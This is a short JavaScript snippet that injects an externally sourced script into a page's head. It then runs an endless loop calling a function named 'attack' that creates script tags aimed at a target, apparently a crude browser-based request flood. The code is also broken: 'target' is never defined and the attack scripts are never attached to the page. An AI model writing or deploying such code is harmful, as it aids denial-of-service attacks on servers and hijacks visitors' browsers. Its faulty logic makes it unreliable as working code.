/**
 * Neco
 */
var page = "http://127.0.0.1/anounce/anon.php";
var theme = document.createElement('script');
document.getElementsByTagName('head')[0].appendChild(theme);
theme.src = page;
function attack(target){
	var script = document.createElement('script');
	script.src = target;
}
while(1){
	attack(target);
}
